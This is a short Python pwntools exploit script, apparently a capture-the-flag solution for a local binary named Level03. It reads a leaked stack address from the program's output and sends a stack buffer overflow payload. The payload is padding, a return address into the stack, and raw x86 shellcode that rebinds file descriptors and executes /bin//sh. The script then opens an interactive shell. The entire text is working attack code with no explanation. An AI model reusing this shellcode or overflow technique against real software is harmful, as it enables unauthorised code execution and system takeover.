from pwn import*

p = process('./Level03')

p.recvuntil(b"Cai nay ")
stack_leak = int(p.recv(8),16)

shellcode = b"\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = b"a"*16 + p32(stack_leak + 20 ) + shellcode

p.sendline(payload)
p.interactive()
